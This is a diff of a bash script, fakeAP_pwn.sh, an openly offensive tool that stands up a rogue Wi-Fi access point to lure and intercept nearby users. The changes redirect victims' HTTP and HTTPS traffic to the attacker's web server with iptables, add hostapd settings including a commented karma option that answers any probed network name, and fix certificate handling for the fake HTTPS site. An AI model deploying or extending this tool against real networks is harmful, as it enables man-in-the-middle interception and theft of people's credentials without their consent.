@@ -1,6 +1,6 @@
 #!/bin/bash
 #----------------------------------------------------------------------------------------------#
-#fakeAP_pwn.sh v0.3 (#108 2010-09-16)                                                          #
+#fakeAP_pwn.sh v0.3 (#109 2010-09-16)                                                          #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
 #---License------------------------------------------------------------------------------------#
 #  This program is free software: you can redistribute it and/or modify it under the terms     #
@@ -62,7 +62,7 @@ diagnostics="false"
 verbose="0"
 
 #---Variables----------------------------------------------------------------------------------#
-  version="0.3 (#108)"               # Version
+  version="0.3 (#109)"               # Version
   gateway=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
     ourIP="10.0.0.1"
      port=$(shuf -i 2000-65000 -n 1) # Random port each time
@@ -288,7 +288,7 @@ function ipTables() { #ipTables mode #$apInterface #$interface #$gateway
          ipTables clear
          command="
          iptables --table nat --append PREROUTING --in-interface $2 -p tcp --destination-port 80  --jump DNAT --to 10.0.0.1:80 ;
-         iptables --table nat --append PREROUTING --in-interface $2 -p tcp --destination-port 443 --jump DNAT --to 10.0.0.1:80 ;
+         iptables --table nat --append PREROUTING --in-interface $2 -p tcp --destination-port 443 --jump DNAT --to 10.0.0.1:443 ;
          iptables --table nat --append PREROUTING --in-interface $3 -p tcp -j REDIRECT"
       elif [ "$1" == "transparent" ]  ; then
          ipTables clear
@@ -747,6 +747,7 @@ action "Killing 'dhcp3 service'" "/etc/init.d/dhcp3-server stop"
 if [ "$mode" == "flip" ] ; then action "Killing 'squid service'" "/etc/init.d/squid stop" ; fi
 if [ "$mode" != "normal" ] ; then action "Killing 'apache2 service'" "/etc/init.d/apache2 stop" ; fi
 action "Killing 'wicd service'" "/etc/init.d/wicd stop" # To prevent channel hopping
+#action "Killing 'network manager'" "service network-manager stop" # for Ubuntu
 
 #----------------------------------------------------------------------------------------------#
 action "Refreshing $wifiInterface" "ifconfig $wifiInterface down && ifconfig $wifiInterface up && sleep 1"
@@ -1375,9 +1376,33 @@ fragm_threshold=2346
 macaddr_acl=0
 auth_algs=3
 ignore_broadcast_ssid=0
+wmm_enabled=1
+wmm_ac_bk_cwmin=4
+wmm_ac_bk_cwmax=10
+wmm_ac_bk_aifs=7
+wmm_ac_bk_txop_limit=0
+wmm_ac_bk_acm=0
+wmm_ac_be_aifs=3
+wmm_ac_be_cwmin=4
+wmm_ac_be_cwmax=10
+wmm_ac_be_txop_limit=0
+wmm_ac_be_acm=0
+wmm_ac_vi_aifs=2
+wmm_ac_vi_cwmin=3
+wmm_ac_vi_cwmax=4
+wmm_ac_vi_txop_limit=94
+wmm_ac_vi_acm=0
+wmm_ac_vo_aifs=2
+wmm_ac_vo_cwmin=2
+wmm_ac_vo_cwmax=3
+wmm_ac_vo_txop_limit=47
+wmm_ac_vo_acm=0
 eapol_key_index_workaround=0
 eap_server=0
-own_ip_addr=127.0.0.1" >> $path
+own_ip_addr=127.0.0.1
+#enable_karma=1 # uncomment this line if you patched hostapd with karma
+#accept_mac_file=/etc/hostapd/hostapd.accept
+#deny_mac_file=/etc/hostapd/hostapd.deny" >> $path
    if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
    if [ "$debug" == "true" ] ; then cat $path; fi
    if [ ! -e $path ] ; then display error "Couldn't create $path" 1>&2 ; cleanup; fi
@@ -1557,13 +1582,9 @@ fi
 #----------------------------------------------------------------------------------------------#
 if [ "$mode" != "normal" ] ; then
    display action "Starting: Web server"
-   if [ ! -e "/etc/ssl/private/ssl-cert-snakeoil.key" ] ; then
+   if [ ! -e "/etc/ssl/private/ssl-cert-snakeoil.key" ] || [ ! -e "/etc/ssl/certs/ssl-cert-snakeoil.pem" ] ; then
       display error "Need to renew certificate" ;
       make-ssl-cert generate-default-snakeoil --force-overwrite     
-      #openssl genrsa -out server.key 1024
-      #openssl req -new -x509 -key server.key -out server.pem -days 1826
-      #mv -f "server.key" "/etc/ssl/private/ssl-cert-snakeoil.key"
-      #mv -f "server.pem" "/etc/ssl/certs/ssl-cert-snakeoil.pem"
    fi
    action "Web Sever" "/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && a2enmod php5 && /etc/init.d/apache2 reload" & #dissable all sites and only enable the fakeAP_pwn one # Don't wait, do the next command
    sleep 2
